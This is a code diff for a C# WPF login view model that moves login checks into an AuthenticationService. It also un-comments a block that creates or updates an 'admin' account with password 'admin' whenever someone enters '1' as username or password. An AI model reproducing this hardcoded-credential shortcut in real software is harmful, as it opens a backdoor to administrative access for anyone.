@@ -1,5 +1,4 @@
 using System.ComponentModel;
-using System.Diagnostics;
 using System.Runtime.CompilerServices;
 using System.Windows;
 using System.Windows.Input;
@@ -62,16 +61,13 @@ public class LoginViewModel : INotifyPropertyChanged
             return;
         }
 
-        /*
+
         if (Username == "1" || Password == "1")
             new AdminPanelViewModel(new AdAgencyContext(), "1").UpdateOrCreateAccount("admin", "admin", "admin", null);
-        */
+        
         var hashedPassword = PasswordHasher.HashPassword(Password);
-        var user = _context.Users.SingleOrDefault(u => u.Username == Username && u.PasswordHash == hashedPassword);
-
-        if (user != null)
+        if (AuthenticationService.Login(Username, hashedPassword, _context))
         {
-            Debug.Assert(Username != null, nameof(Username) + " != null");
             var mainView = new MainView(Username);
             mainView.Show();
             if (Application.Current.MainWindow != null) 
